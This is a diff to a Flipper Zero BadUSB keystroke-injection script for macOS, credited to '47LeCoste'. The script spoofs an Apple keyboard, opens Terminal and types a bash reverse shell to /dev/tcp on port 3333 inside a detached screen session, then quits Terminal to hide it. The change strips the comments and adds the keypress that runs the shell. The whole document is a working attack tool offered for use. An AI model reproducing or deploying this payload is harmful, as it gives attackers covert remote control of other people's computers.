@@ -1,8 +1,6 @@
 REM Author: 47LeCoste
 REM Version 1.0 (Flipper Ducky)
-REM * instruction nr. 1
 ID 05ac:021e Apple:Keyboard
-REM * instruction nr.2
 DELAY 3000
 GUI SPACE
 DELAY 500
@@ -10,15 +8,14 @@ STRING terminal.app
 DELAY 200
 ENTER
 DELAY 2000
-REM * instruction nr.3
 STRING screen bash
 DELAY 200
 ENTER
-DELAY 200
-REM * instruction nr.4
-STRING bash -i>& /dev/tcp/0.0.0.0/3333 0>&1; history -r
 DELAY 1000
-REM * instruction nr.5
-CTRL a d 
+STRING bash -i>& /dev/tcp/0.0.0.0/3333 0>&1; history -r
+DELAY 200
+ENTER
+DELAY 1500
+CTRL a d
+DELAY 1000
 GUI q
-REM * instruction nr.6
